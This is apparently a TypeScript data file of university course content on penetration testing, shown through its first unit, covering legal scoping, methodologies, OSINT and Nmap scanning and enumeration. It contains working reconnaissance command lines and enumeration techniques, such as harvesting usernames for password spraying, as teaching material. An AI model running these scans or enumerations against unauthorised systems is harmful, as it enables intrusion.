/**
 * Academics - RGPV Cyber Security 7th-semester subject: CY-702(A)
 * Penetration Testing and Vulnerability Analysis.
 *
 * Structure mirrors subject-ad-502.ts: units -> one chapter per unit ->
 * numbered sections.  Each section carries body paragraphs, bullets, one
 * diagram, a table or code sample, a callout, key terms, and examiner-style
 * exam questions (7- or 14-mark, each with a 5-7 point outline).
 */

import type { AcademicSubject } from "./types";

export const cy702a: AcademicSubject = {
  id: "cy-702-a",
  code: "CY-702(A)",
  title: "Penetration Testing and Vulnerability Analysis",
  semester: "VII Semester",
  program: "RGPV · Cyber Security",
  tagline:
    "Every stage of a professional penetration test as one connected story: authorization and scoping, reconnaissance and scanning, exploitation and pivoting, web and wireless attack, reporting and remediation, closing with mobile, cloud, IoT and red-team practice.",
  description:
    "Five units walk from what a penetration test legally and ethically is - the rules of engagement, black/grey/white boxes, PTES-style methodology - through footprinting, OSINT, Nmap scanning and vulnerability analysis, into exploitation, privilege escalation, post-exploitation and pivoting, then the web application attack surface with OWASP-driven testing, wireless attacks against WEP through WPA3, and the human layer of social engineering and physical testing. The second half covers cryptography as the tester sees it, key management, secure channels, and the reporting craft: CVSS scoring, prioritized remediation and stakeholder communication. The unit ends where modern engagements live - mobile app security, cloud shared-responsibility testing, IoT exposure, red teaming, CTF practice and the capstone project.",
  accentColor: "#f59e0b",
  emoji: "PT",
  unitCount: 5,
  totalSections: 35,
  units: [
    {
      number: 1,
      roman: "I",
      title: "Foundations, Reconnaissance and Scanning",
      summary:
        "Unit I frames the whole discipline: what a penetration test is and how it differs from scanning and auditing, the legal and ethical machinery that makes one lawful, the black/grey/white engagement types, the PTES-style methodology that sequences the work, and the technical opening moves - footprinting, OSINT, network scanning, enumeration and vulnerability scanning tools.",
      chapter: {
        number: "01",
        title: "Rules of Engagement and the Opening Moves",
        intro:
          "Unit I covers the introduction to penetration testing, legal and ethical considerations, the types of penetration testing, PTES/NIST-style methodologies, and the information-gathering toolkit: footprinting and reconnaissance techniques, network scanning and enumeration, OSINT (SINT) gathering, and the vulnerability scanners that turn open services into a prioritized findings list. Every later unit assumes this vocabulary and the paper trail this unit teaches you to build.",
        inOneBreath:
          "A penetration test is an authorized, scoped, time-boxed simulation of a real attacker with a written report at the end; without signed authorization it is a crime. Scope + rules of engagement + get-out-of-jail letter precede any packet. Black/grey/white box trades realism against coverage; external vs internal trades perimeter against insider. Methodologies (PTES, NIST SP 800-115, OWASP WSTG) order the work: pre-engagement -> recon -> threat model -> vulnerability analysis -> exploitation -> post-exploitation -> reporting. Recon divides into passive (OSINT: no packets to the target) and active (scanning: packets, logs, legal exposure). Nmap turns an IP range into a service inventory; Nessus/OpenVAS turn services into CVSS-ranked vulnerabilities.",
        sections: [
          {
            number: "1.1",
            title: "What is penetration testing?",
            body: [
              "Penetration testing is the authorized simulation of a real-world attack against systems, networks and applications, carried out to find exploitable weaknesses before a malicious attacker does and to demonstrate their business impact. Three properties make it a test rather than an attack: explicit written authorization from the asset owner, a documented scope and time window, and a final report with remediation guidance. The National Institute of Standards and Technology (NIST SP 800-115) defines it as security testing in which evaluators mimic real attackers operating under constraints agreed with the organization - the constraints are what distinguish a professional from a criminal.",
              "The distinction from neighbouring activities is a guaranteed exam question. A vulnerability assessment discovers and lists weaknesses; a penetration test goes one step further and proves exploitability by actually exploiting them - showing, for example, that CVE-2021-44228 (Log4Shell) does not merely exist on the server but yields a reverse shell. A security audit checks compliance against a checklist such as ISO 27001; it asks 'are the controls documented?', while a pentest asks 'do the controls actually stop a determined attacker?'. A red team exercise goes further still: objectives-based, stealthy, multi-domain adversary emulation over weeks. The numbers fix the contrast: a scan of a /24 might finish in 20 minutes and produce 300 findings; a full pentest typically runs 40-80 consultant-hours over 1-2 weeks and produces 10-30 exploitation-proven findings.",
              "Why organizations pay for this: a breach found by a tester costs the price of the engagement, while the same weakness found by ransomware operators costs millions. IBM's Cost of a Data Breach study pegs the average breach at roughly USD 4.4 million, against a typical web application pentest costing a few thousand dollars - a risk-reduction ratio in the hundreds. Regulators and customers reinforce the economics: PCI DSS 11.4 mandates penetration testing at least annually and after significant changes; the RBI and SEBI impose similar expectations on Indian banks and exchanges.",
              "Exam framing: expect 'define penetration testing and distinguish it from vulnerability assessment, audit and red teaming' for 7 marks. Write the three defining properties (authorization, scope, report), give one numeric contrast per activity, and close with the certification landscape - CEH, OSCP, CREST, PCI QSA - because examiners reward the professional context as much as the definition.",
            ],
            keyTerms: [
              { term: "Penetration test", definition: "An authorized, scoped, time-boxed attack simulation that proves exploitability and ends in a written report." },
              { term: "Vulnerability assessment", definition: "Discovery and listing of weaknesses without proving exploitation - typically scanner-driven." },
              { term: "Red team", definition: "Objectives-based, stealthy adversary emulation across people, process and technology over an extended period." },
              { term: "Rules of engagement", definition: "The written agreement fixing scope, targets, techniques allowed, timing and emergency contacts." },
            ],
            diagram: {
              kind: "compare",
              title: "Vulnerability scan vs penetration test",
              caption:
                "The scanner tells you the door is unlocked; the pentest walks through it and shows what an attacker reaches next.",
              left: {
                heading: "Vulnerability scan",
                items: [
                  "Automated, breadth-first, hours",
                  "Finds and lists weaknesses with CVE ids",
                  "May contain false positives - never proven",
                  "Example: Nessus flags Log4Shell on port 8080",
                ],
              },
              right: {
                heading: "Penetration test",
                items: [
                  "Manual + automated, depth-first, weeks",
                  "Proves exploitability with evidence",
                  "Chains weaknesses across systems",
                  "Example: Log4Shell -> reverse shell -> admin creds",
                ],
              },
            },
            bullets: [
              "Three properties define a test: written authorization, documented scope and window, final report.",
              "NIST SP 800-115 orders the work: planning -> discovery -> attack -> reporting.",
              "A scan may run in 20 minutes over 256 hosts; a full engagement runs 40-80 hours over 1-2 weeks.",
              "Pentest proves exploitability (reverse shell evidence); assessment only lists CVEs.",
              "PCI DSS 11.4 requires annual testing and re-testing after significant change.",
              "Value case: average breach cost ~USD 4.4 million vs engagement cost of a few thousand dollars.",
            ],
            callout: {
              type: "exam",
              title: "The one-line definition earns the first mark",
              body: "Open the answer with a verbatim one-liner: 'an authorized simulated attack on a system to identify exploitable vulnerabilities and assess their security posture'. Examiners award the definition mark separately from the comparison table, and the table - scan vs test vs audit vs red team with one number per row - earns the rest.",
            },
            examQuestions: [
              {
                q: "Define penetration testing and explain in detail how it differs from a vulnerability assessment, a security audit and a red team exercise. Illustrate each difference with a concrete numeric example.",
                marks: 14,
                outline: [
                  "Definition: authorized simulated attack proving exploitability, ending in a report",
                  "Three defining properties: written authorization, scope and time window, remediation report",
                  "Vulnerability assessment: scanner-driven listing (Nessus flags Log4Shell on 8080) - no exploitation",
                  "Penetration test: manual depth-first proof (Log4Shell -> shell -> admin creds in 40-80 hours)",
                  "Security audit: checklist compliance against ISO 27001 controls, asks are controls documented",
                  "Red team: objectives-based stealth adversary emulation over weeks, evaluated by the blue team detecting it",
                  "Economics and mandates: breach ~USD 4.4M vs engagement cost; PCI DSS 11.4 annual testing",
                ],
              },
              {
                q: "State the three properties that distinguish a penetration test from a criminal attack, and explain why PCI DSS mandates annual testing.",
                marks: 7,
                outline: [
                  "Written authorization signed by the asset owner before any activity",
                  "Documented scope, techniques allowed and time window",
                  "Final report with findings, evidence and remediation guidance",
                  "PCI DSS 11.4: annual test plus retest after significant changes",
                  "Rationale: prove exploitable paths before attackers, at engagement cost vs breach cost",
                ],
              },
            ],
          },
          {
            number: "1.2",
            title: "Legal and ethical considerations",
            body: [
              "The first deliverable of any engagement is legal, not technical. Authorization takes the form of a signed contract or statement of work that fixes scope (which IPs, domains, applications, locations), rules of engagement (techniques permitted - social engineering? DoS? physical entry?), the testing window (off-peak hours to limit business impact), and emergency contacts for when a test takes a production system down. Alongside it travels the 'get-out-of-jail letter' - a document the tester carries so that a SOC or law-enforcement officer encountering the activity can verify it is sanctioned. Working outside scope is not a mistake to negotiate later; scanning one IP beyond the agreed range is unauthorized access under the law.",
              "The statutes a tester must know: in India, the Information Technology Act 2000 (as amended 2008) - Section 43 penalizes unauthorized access and data damage, Section 66 criminalizes computer-related offences, Section 66C covers identity theft, Section 72 breach of confidentiality; internationally the Computer Fraud and Abuse Act (CFAA, USA) criminalizes unauthorized access with felony exposure, and the UK Computer Misuse Act 1990 carries up to 10 years for the most serious offences. The ethical layer sits on top of the legal one: competence (do not accept work beyond your skill), confidentiality (findings and client data never leak), non-disclosure of techniques to third parties, and honest reporting - a tester who inflates severity to sell more remediation work destroys the profession's core currency, trust.",
              "A worked example of why the paperwork matters: during a 2016-era engagement pattern that repeats often, a tester scans the public IP range in scope, finds an adjacent web application, and 'helpfully' tests it too - discovering SQL injection. That adjacent app belongs to a subsidiary not covered by the contract; the tester has now committed unauthorized access, the finding is inadmissible, and the firm is exposed. The professional sequence is the reverse: note the out-of-scope asset, verify ownership, request a scope amendment in writing, and only then test it. The same discipline applies to social engineering and DoS components - many contracts exclude both because their blast radius is uncontrollable.",
              "Exam framing: 'Discuss the legal and ethical issues involved in penetration testing' is a 7-mark perennial. Structure the answer as documentation (contract, scope, RoE, get-out-of-jail letter), statute layer (IT Act 43/66/66C/72, CFAA, CMA), ethics layer (competence, confidentiality, honest reporting), and close with the out-of-scope example above - the concrete failure case is what separates a full-mark answer from a list.",
            ],
            keyTerms: [
              { term: "Rules of engagement (RoE)", definition: "The agreed limits on techniques, targets and timing of the test." },
              { term: "Get-out-of-jail letter", definition: "A signed authorization the tester shows to SOC staff or police during the engagement." },
              { term: "Scope creep", definition: "Testing assets outside the signed agreement - legally unauthorized access even if technically helpful." },
              { term: "IT Act 2000 Sec 66", definition: "The Indian statute criminalizing dishonest or fraudulent computer-related acts." },
            ],
            diagram: {
              kind: "pyramid",
              title: "The authorization stack - lowest layer first",
              caption: "No packet leaves the tester before every layer below it is signed and in place.",
              tiers: [
                { label: "Signed contract / SOW", note: "commercial terms, liability, NDA" },
                { label: "Scope document", note: "IPs, domains, apps, locations in and out" },
                { label: "Rules of engagement", note: "techniques allowed, timing, DoS excluded?" },
                { label: "Get-out-of-jail letter", note: "shown to SOC / law enforcement on challenge" },
                { label: "Technical work", note: "only now may scanning begin" },
              ],
            },
            bullets: [
              "Documents before packets: contract, scope, RoE, get-out-of-jail letter, emergency contacts.",
              "IT Act 2000/2008: Sec 43 unauthorized access and damage; Sec 66 computer offences; Sec 66C identity theft; Sec 72 confidentiality.",
              "CFAA (USA) and Computer Misuse Act 1990 (UK) criminalize out-of-scope access with felony exposure.",
              "Ethics: competence, confidentiality, no technique disclosure, honest severity reporting.",
              "Out-of-scope discovery: stop, verify ownership, request written scope amendment, then test.",
              "Many contracts exclude social engineering and denial-of-service because blast radius is uncontrollable.",
            ],
            callout: {
              type: "warning",
              title: "Scope creep is a crime, not a favour",
              body: "Scanning one IP outside the signed range is unauthorized access under IT Act Sec 43 and the CFAA - the tester's intent ('helping the client') is legally irrelevant. The marked answer always stops at the boundary and requests a written amendment.",
            },
            table: {
              caption: "The legal instruments a tester meets across jurisdictions.",
              headers: ["Instrument", "Jurisdiction", "What it covers", "Tester relevance"],
              rows: [
                ["IT Act Sec 43", "India", "Unauthorized access, data damage - civil penalties", "Out-of-scope scanning liability"],
                ["IT Act Sec 66/66C", "India", "Computer offences, identity theft - criminal", "Credential theft during test must stay in scope"],
                ["CFAA 18 U.S.C. 1030", "USA", "Unauthorized access, exceeding authorized access", "Basis of most US pentest lawsuits"],
                ["Computer Misuse Act 1990", "UK", "Unauthorised access; up to 10 years for worst cases", "Covers even 'harmless' port scans without consent"],
                ["GDPR Art 32", "EU", "Security of processing for personal data", "Testing must not expose personal data; NDA mandatory"],
              ],
            },
            examQuestions: [
              {
                q: "Discuss the legal and ethical considerations that govern a penetration test. Cover the documentation required, the relevant Indian and international statutes, the ethics of reporting, and one worked failure case.",
                marks: 14,
                outline: [
                  "Documentation: contract/SOW, scope document, rules of engagement, get-out-of-jail letter",
                  "Timing and emergency contacts: off-peak windows, SOC deconfliction numbers",
                  "Indian law: IT Act Sec 43 (access/damage), Sec 66 (offences), 66C (identity theft), 72 (confidentiality)",
                  "International: CFAA (US) felony exposure; UK Computer Misuse Act up to 10 years",
                  "Ethics: competence, confidentiality, no disclosure of techniques, honest severity",
                  "Worked failure: testing an adjacent app outside scope = unauthorized access, finding inadmissible",
                  "Correct response: stop, verify ownership, written scope amendment, then proceed",
                ],
              },
              {
                q: "What is a 'get-out-of-jail letter' and when is it produced? Why do many contracts exclude DoS testing?",
                marks: 7,
                outline: [
                  "Signed authorization carried during the engagement",
                  "Produced when the SOC or police challenge the observed attack traffic",
                  "Prevents mistaken escalation and project shutdown",
                  "DoS excluded: blast radius uncontrollable, collateral outage of third parties",
                  "Alternative: staged resilience tests with drain stops and rollback plans",
                ],
              },
            ],
          },
          {
            number: "1.3",
            title: "Types of penetration testing",
            body: [
              "Engagements are classified on two axes: how much the tester knows (knowledge axis) and where the tester starts (access axis). On the knowledge axis, a black-box test gives the tester only the target's name or IP range - exactly what an external attacker sees - so discovery is real but slow and may miss internal weaknesses; a white-box test hands over source code, architecture diagrams, network maps and credentials, maximizing coverage and code-level findings; grey-box gives partial knowledge, typically a low-privilege user account, modelling the common real-world case of an attacker who has already phished one employee. The knowledge level is a dial between realism (black) and thoroughness (white), and the choice follows the engagement goal - compliance-driven tests buy coverage, so they lean white-box.",
              "On the access axis, an external test attacks the internet-facing perimeter from the tester's own infrastructure: the attack surface is firewalls, VPN gateways, web applications, mail servers and exposed remote-access services. An internal test starts from inside the network - often on a staff VLAN or VPN segment - and asks the more dangerous question: what can an insider or an already-phished laptop reach? The classic internal finding is lateral movement: a workstation with SMB signing misconfigurations and domain users who can read the entire file share chain. A 2020s-typical mid-size engagement spends roughly 60-70% of hours on external/web surface and 30-40% internal, because perimeter weaknesses are reachable by anyone while internal ones require a foothold first.",
              "Further subtypes matter for the exam's 'list the types' section: targeted (or team) testing runs testers and defenders in awareness of each other to tune detection; blind/double-blind tests hide the target even from defenders, testing the SOC's monitoring; application-specific tests scope to one web or mobile app against the OWASP methodologies; social-engineering and physical tests target the human and door layers; and automated continuous testing runs scanner-plus-exploit pipelines weekly. Each subtype answers a different question the business is really asking, and a professional proposal names the subtype explicitly in the scope document from section 1.2.",
              "Exam framing: the examiner wants the two axes drawn, not just a list. Sketch the knowledge x access matrix, place black-box external, white-box internal and grey-box phishing-foothold in their quadrants, attach one numeric consequence per quadrant (coverage hours, findings count), and close by naming which quadrant PCI DSS or a bank's RBI-guideline test usually buys - that mapping sentence earns the application mark.",
            ],
            keyTerms: [
              { term: "Black-box test", definition: "Tester knows only the target address - maximum realism, minimum coverage." },
              { term: "White-box test", definition: "Tester receives source, architecture and credentials - maximum coverage and code-level findings." },
              { term: "Grey-box test", definition: "Partial knowledge, usually a low-privilege account - models a post-phishing attacker." },
              { term: "Lateral movement", definition: "Progressing from an initial internal foothold to other hosts and higher privileges." },
            ],
            diagram: {
              kind: "matrix",
              title: "The two axes of engagement type",
              caption: "Knowledge grows rightward, access grows downward - each quadrant answers a different business question.",
              axes: { x: "Knowledge given to tester (none -> full)", y: "Starting position (outside -> inside)" },
              quadrants: [
                { label: "Black-box external", note: "only the domain name; 60-70% of typical hours" },
                { label: "White-box external", note: "full code + configs; compliance-driven, max coverage" },
                { label: "Grey-box internal", note: "phished-user foothold; tests lateral movement" },
                { label: "White-box internal", note: "internal code and creds; insider-threat modelling" },
              ],
            },
            bullets: [
              "Knowledge axis: black (address only), grey (low-privilege account), white (source, diagrams, creds).",
              "Access axis: external (perimeter from outside) vs internal (staff VLAN or VPN foothold).",
              "Black box maximizes realism; white box maximizes coverage; grey box models the phished employee.",
              "Targeted and double-blind tests additionally exercise the defenders' detection, not just the systems.",
              "Typical mid-size engagement splits 60-70% external/web hours vs 30-40% internal.",
              "Application-specific, social-engineering and physical tests scope to one layer each.",
            ],
            callout: {
              type: "tip",
              title: "Match the type to the goal, say so explicitly",
              body: "A bank proving PCI compliance buys white-box application testing; a SaaS company buying resilience buys black-box external; an enterprise worried about phishing buys grey-box internal. Writing one sentence that connects engagement type to business goal is what the top-mark answer adds to the list.",
            },
            examQuestions: [
              {
                q: "Explain the classification of penetration tests. Draw the knowledge x access matrix, describe black-box, grey-box and white-box external and internal tests with numeric consequences, and state which type each common business driver selects.",
                marks: 14,
                outline: [
                  "Knowledge axis: black (address only) -> grey (low-priv creds) -> white (source + architecture)",
                  "Access axis: external perimeter vs internal staff VLAN / VPN foothold",
                  "Black-box external: maximum realism, discovery-heavy, 60-70% of typical hours",
                  "White-box: maximum coverage, code-level findings, chosen by compliance drivers",
                  "Grey-box internal: models the phished employee; tests lateral movement and domain hardening",
                  "Subtypes: targeted, double-blind, application-specific, social-engineering, physical, continuous",
                  "Mapping: PCI/RBI -> white-box app; SaaS resilience -> black-box external; phishing concern -> grey-box internal",
                ],
              },
              {
                q: "Distinguish black-box and white-box testing with one advantage and one disadvantage each, and name the type a compliance audit would choose.",
                marks: 7,
                outline: [
                  "Black-box: tester knows only the target - realistic external attacker view",
                  "Advantage: unbiased discovery; disadvantage: slower, may miss internal weaknesses",
                  "White-box: full knowledge - source, diagrams, credentials",
                  "Advantage: maximum coverage and code-level issues; disadvantage: less realistic attacker model",
                  "Compliance audit chooses white-box for coverage evidence",
                ],
              },
            ],
          },
          {
            number: "1.4",
            title: "Penetration testing methodologies",
            body: [
              "A methodology is the standard sequence that turns ad-hoc hacking into repeatable, defensible work. The Penetration Testing Execution Standard (PTES) defines seven phases: pre-engagement interactions (scope, contracts - sections 1.1 and 1.2), intelligence gathering (reconnaissance), threat modeling (deciding which attack paths are worth the hours), vulnerability analysis (scanning plus manual review), exploitation, post-exploitation, and reporting. NIST SP 800-115 compresses the same flow into four: planning, discovery, attack, reporting, and adds the government-grade discipline of documenting every action for auditability. The OWASP Web Security Testing Guide (WSTG) and OWASP Testing Guide v4 supply the checklist depth for the application layer, while the OSSTMM frames testing as measurable operational security verification with metrics such as attack surface and trust levels.",
              "Methodologies pay off concretely in scheduling and coverage. A two-week web-centric engagement allocates its 80 hours roughly: 8 hours pre-engagement and admin, 16 hours reconnaissance and mapping, 8 hours threat modeling, 12 hours scanning and manual vulnerability analysis, 20 hours exploitation and post-exploitation, 16 hours reporting. Skipping threat modeling is the classic junior mistake - the tester scans everything instead of asking which three paths (internet-facing app, VPN with weak MFA, forgotten subdomain) carry the business's real risk, and burns hours on a network the report will spend two lines on. The threat model output is a ranked list of attack paths with likelihood and impact, exactly the artifact examiners want described.",
              "The methodology also fixes what 'done' means. Exploitation is bounded by the RoE: proving SQL injection with a data read of one harmless table may be in scope, dumping the whole customer database is not; post-exploitation stops at demonstrating privilege escalation and persistence capability, not at destabilizing the host. Every exploited host gets time-stamped evidence (screenshots, command logs, hashes) because the report must be reproducible and the client's SOC must be able to correlate the tester's traffic with their own logs. A methodology without evidence discipline produces findings no auditor will accept.",
              "Exam framing: 'Explain the phases of a penetration testing methodology' is a 7-mark standard. Name PTES's seven phases in order with one sentence each, add NIST's four-phase compression, quote the 80-hour allocation as the worked example, and close with why threat modeling precedes scanning - examiners consistently look for that ordering argument.",
            ],
            keyTerms: [
              { term: "PTES", definition: "Penetration Testing Execution Standard - seven phases from pre-engagement to reporting." },
              { term: "NIST SP 800-115", definition: "US guidance defining the planning -> discovery -> attack -> reporting test cycle." },
              { term: "OWASP WSTG", definition: "The Web Security Testing Guide - the definitive checklist catalogue for application testing." },
              { term: "Threat modeling", definition: "Ranking attack paths by likelihood and impact to decide where the test spends its hours." },
            ],
            diagram: {
              kind: "pipeline",
              title: "PTES - the seven-phase pipeline",
              caption: "Each phase's output is the next phase's input; reporting is a phase, not an afterthought.",
              stages: [
                { label: "1 Pre-engagement", note: "scope, contracts, RoE" },
                { label: "2 Intelligence gathering", note: "OSINT, footprinting" },
                { label: "3 Threat modeling", note: "rank the attack paths" },
                { label: "4 Vulnerability analysis", note: "scan + manual review" },
                { label: "5 Exploitation", note: "prove the paths" },
                { label: "6 Post-exploitation", note: "escalate, pivot, persist" },
                { label: "7 Reporting", note: "evidence + remediation" },
              ],
            },
            bullets: [
              "PTES phases: pre-engagement, intelligence gathering, threat modeling, vulnerability analysis, exploitation, post-exploitation, reporting.",
              "NIST SP 800-115 compresses to planning -> discovery -> attack -> reporting with audit-grade documentation.",
              "OSSTMM adds measurable metrics: attack surface, trust levels, operational security verification.",
              "80-hour allocation example: 16 recon, 12 vulnerability analysis, 20 exploitation, 16 reporting.",
              "Threat modeling precedes scanning - it picks the three paths that carry real business risk.",
              "Evidence discipline: timestamps, screenshots and command logs make findings reproducible and admissible.",
            ],
            callout: {
              type: "exam",
              title: "Order is the answer",
              body: "Examiners award the phase-list marks in order - writing 'exploitation' before 'threat modeling' signals you memorized a list, not a process. Add the one sentence that earns the analysis mark: threat modeling before scanning concentrates hours on ranked attack paths instead of uniform scanning.",
            },
            table: {
              caption: "Two-week web-centric engagement: the 80 hours, allocated.",
              headers: ["Phase", "Hours", "Key outputs"],
              rows: [
                ["Pre-engagement + admin", "8", "Signed scope, RoE, kickoff notes"],
                ["Intelligence gathering", "16", "Domain map, OSINT dossier, target list"],
                ["Threat modeling", "8", "Ranked attack paths, test plan"],
                ["Vulnerability analysis", "12", "Scan results triaged, manual review notes"],
                ["Exploitation + post-exploitation", "20", "Shells, escalations, evidence pack"],
                ["Reporting", "16", "Executive summary, findings, remediation"],
              ],
            },
            examQuestions: [
              {
                q: "Explain the seven phases of the PTES methodology with the purpose and key output of each. Compare with NIST SP 800-115 and justify why threat modeling precedes scanning, using a numeric hour allocation.",
                marks: 14,
                outline: [
                  "Pre-engagement: scope, contracts, RoE - output signed authorization",
                  "Intelligence gathering: OSINT and footprinting - output target dossier",
                  "Threat modeling: rank attack paths by likelihood and impact - output test plan",
                  "Vulnerability analysis: scanning plus manual review - output triaged findings",
                  "Exploitation: prove the paths within RoE - output shells and evidence",
                  "Post-exploitation: escalation, pivoting, persistence capability - output impact chain",
                  "Reporting: exec summary, findings, remediation; NIST compresses to 4 phases; 80-hour allocation quoted",
                ],
              },
              {
                q: "Why must threat modeling come before vulnerability scanning in a professional engagement?",
                marks: 7,
                outline: [
                  "Scanning is breadth-first and blind to business value",
                  "Threat modeling ranks paths: internet app, weak-MFA VPN, forgotten subdomain",
                  "Hours concentrate on the highest-impact paths instead of uniform scanning",
                  "Output feeds the RoE boundaries for exploitation",
                  "Skipped modeling = hours burned on networks the report covers in two lines",
                ],
              },
            ],
          },
          {
            number: "1.5",
            title: "Footprinting and reconnaissance techniques",
            body: [
              "Footprinting is the systematic collection of information about a target before touching it, and reconnaissance (recon) is its active counterpart; together they are phase two of every methodology. Passive footprinting touches no target systems: the data comes from third parties - WHOIS registries (registrant, nameservers, expiry dates), DNS records (A, MX, TXT, NS entries leak mail providers and cloud hosts), search engines, certificate-transparency logs (crt.sh reveals subdomains the moment a certificate is issued), Shodan and Censys (banner databases indexing exposed services), job postings (a JD asking for 'Fortinet and vCenter experience' is a technology inventory) and social media (employee names, email formats, badge photos). Passive work is invisible to the target and legally safe - no authorization needed to read public records.",
              "Active footprinting sends packets: ping sweeps and traceroute to map the network path, port scans to find live services, and web crawling to inventory the application surface. The intelligence yield compounds - a worked passive dossier for example.com might contain: WHOIS registered 2009 via Registrar X, MX records point to Google Workspace, TXT record includes a verification token for a SaaS (revealing a secondary vendor), certificate transparency exposes 43 subdomains including staging.example.com and vpn-old.example.com, and LinkedIn shows 120 employees with firstname.lastname emails. The forgotten subdomains are the real prize: staging environments routinely skip the hardening production receives, and Shodan history shows vpn-old.example.com still answering on TCP 443 with an outdated SSL stack.",
              "OSINT tooling turns this from manual browsing into pipeline work: theHarvester scrapes search engines and certificate logs for emails and hosts; Maltego maps entities and relationships into graphs; Recon-ng and Amass automate subdomain enumeration with permutation and brute-force modules; Shodan query operators (org:, port:, http.title:) find the target's exposed services globally. Google dorking (section 1.7 covers operators) extracts files the site owner forgot to protect. A competent tester budgets 15-20% of engagement hours here, because each hour of recon saves multiples of hours later: knowing the target runs FortiGate VPNs selects the right exploit shortlist before the first scan packet is sent.",
              "Exam framing: 'What is footprinting? Explain passive and active techniques with tools' is a 7-mark staple. Define both, give the worked dossier example with its 43-subdomain yield, tabulate five passive sources and five active tools, and close with the legal note - passive reads public data, active requires authorization - which the examiner treats as the professional-judgment mark.",
            ],
            keyTerms: [
              { term: "Footprinting", definition: "Systematic pre-contact collection of target information from public and third-party sources." },
              { term: "OSINT", definition: "Open-source intelligence - information gathered from public sources without touching the target." },
              { term: "Certificate transparency", definition: "Public logs of issued TLS certificates - a reliable subdomain discovery channel (crt.sh)." },
              { term: "Google dork", definition: "A search-engine operator query (site:, filetype:, inurl:) that extracts exposed content." },
            ],
            diagram: {
              kind: "fork",
              title: "Recon branches: passive first, active second",
              caption: "Passive sources cost nothing and stay invisible; active moves need the signed scope from Unit 1.2.",
              start: "Intelligence gathering",
              branches: [
                { label: "Passive - WHOIS, DNS, crt.sh, Shodan", outcome: "registrar, mail stack, 43 subdomains, exposed banners - no packets to target", good: true },
                { label: "Passive - LinkedIn, job posts", outcome: "email format firstname.lastname, technology inventory from JDs", good: true },
                { label: "Active - ping sweep, traceroute, port scan", outcome: "live-host and service map - logged by the target, needs authorization", good: false },
                { label: "Active - web crawl, directory brute-force", outcome: "application surface - only after passive sources are exhausted", good: false },
              ],
            },
            bullets: [
              "Passive sources: WHOIS, DNS records, certificate transparency (crt.sh), Shodan/Censys, search engines, LinkedIn, job posts.",
              "Active moves: ping sweep, traceroute, port scan, web crawling, directory brute-force - all logged by the target.",
              "Worked yield: 43 subdomains from crt.sh; staging.example.com and vpn-old.example.com are the classic soft targets.",
              "Tools: theHarvester, Maltego, Recon-ng, Amass, Shodan operators (org:, port:, http.title:).",
              "Budget 15-20% of engagement hours on recon; every hour saves multiples in later phases.",
              "Email format from LinkedIn (firstname.lastname) feeds the phishing campaign of section 3.5.",
            ],
            callout: {
              type: "tip",
              title: "Read the certificate logs first",
              body: "Certificate transparency is the highest-yield passive source in modern recon: every issued TLS cert is logged publicly, so crt.sh returns subdomains - including staging and admin hosts - that never appear in DNS brute-force. One query, zero packets to the target, and typically dozens of leads.",
            },
            table: {
              caption: "The passive recon starter kit and what each source yields.",
              headers: ["Source", "Query example", "Yield"],
              rows: [
                ["WHOIS (whois example.com)", "registrant, nameservers, expiry", "Ownership, hosting choices, takeover risk on expiry"],
                ["DNS records (dig ANY example.com)", "A, MX, TXT, NS, SPF", "Mail provider, cloud host, vendor tokens"],
                ["crt.sh", "%25.example.com", "All logged subdomains incl. staging/admin hosts"],
                ["Shodan", "org:ExampleCo port:443", "Exposed services with banners and versions"],
                ["theHarvester", "-d example.com -b all", "Emails, hosts, names from search engines"],
                ["LinkedIn / job posts", "site:linkedin.com example.com", "Staff list, email format, technology stack"],
              ],
            },
            examQuestions: [
              {
                q: "Define footprinting and differentiate passive from active reconnaissance. Describe five passive sources and five tools with the intelligence each yields, and support with a worked dossier example.",
                marks: 14,
                outline: [
                  "Footprinting: pre-contact systematic information collection about the target",
                  "Passive: no packets to target - WHOIS, DNS, crt.sh, Shodan, LinkedIn, job posts",
                  "Active: packets sent and logged - sweeps, traceroute, scans, crawls; needs authorization",
                  "Worked dossier: registrar since 2009, Google Workspace MX, 43 subdomains from crt.sh",
                  "Prize finding: staging.example.com unhardened; vpn-old still on 443 with old TLS",
                  "Tools: theHarvester, Maltego, Recon-ng, Amass, Shodan operators",
                  "Budget and payoff: 15-20% of hours; recon knowledge selects exploit shortlists early",
                ],
              },
              {
                q: "Explain why certificate-transparency logs are a high-yield passive recon source, with one query example.",
                marks: 7,
                outline: [
                  "Every issued TLS certificate is logged in public CT logs",
                  "crt.sh query %.example.com lists all logged subdomains",
                  "Reveals staging, admin and legacy hosts missed by DNS brute-force",
                  "Zero packets sent to the target - passive and safe",
                  "Feeds both web-app scoping and the forgotten-subdomain attack path",
                ],
              },
            ],
          },
          {
            number: "1.6",
            title: "Network scanning and enumeration",
            body: [
              "Scanning converts an address range into a live inventory: which hosts exist, which ports are open, which service and version answers on each port, and which operating system the stack resembles. The sequence is layered: a host-discovery sweep (ICMP echo, TCP SYN to 443/80, ARP on local segments) prunes dead addresses - on a /24 of 256 addresses a sweep may leave 37 live; a port scan probes the survivors across 65,535 TCP ports (or a curated top-1000); a service/version scan (-sV) banners each open port and fingerprints versions; and OS detection (-O) reads TCP/IP stack quirks such as TTL values, window sizes and TCP options. Enumeration then interrogates the discovered services for structured data - SMB share lists and users (445), SNMP community strings and interface tables (161), LDAP directory objects (389), SMTP user verification via VRFY (25), and DNS zone transfers (53, the AXFR that hands over the whole zone if misconfigured).",
              "Nmap is the workhorse, and its flag grammar is examinable in itself. A realistic production sequence: nmap -sn 10.0.2.0/24 discovers 37 hosts without port scanning; nmap -sS -sV -O -p- -T4 --top-ports 65535 10.0.2.14 finds 14 open ports including 22/OpenSSH 8.2, 445/Samba 4.11, 3306/MySQL 5.7; the version strings feed vulnerability correlation directly. Scan-type choice trades stealth against reliability: a SYN scan (-sS, half-open) never completes the handshake and evades naive logging; a connect scan (-sT) is slower but needs no raw sockets; FIN/Xmas/NULL scans exploit RFC behavior to slip past some firewalls but are useless against Windows stacks that answer closed ports with RST regardless; a UDP scan (-sU) is slow and essential for SNMP, DNS and NTP; and an ACK scan (-sA) maps firewall rule sets rather than services.",
              "Enumeration is where scanning becomes intelligence. On 445 with Samba 4.11, enum4linux or crackmapexec returns 3 shares (public, finance, print$), a password policy of minimum 8 characters, and 28 usernames - the username list feeds the password-spraying attempt in Unit IV. SNMP with the default community 'public' on 161 exposes interface descriptions, connected device inventories and sometimes routing tables; a VRFY-enabled mail server at 25 confirms which of the 28 names have mailboxes, tripling phishing accuracy. Every enumeration result is logged against the scope sheet, because enumeration is the phase where testers most often touch an asset (a print server, an IoT device on the same VLAN) that the contract did not cover.",
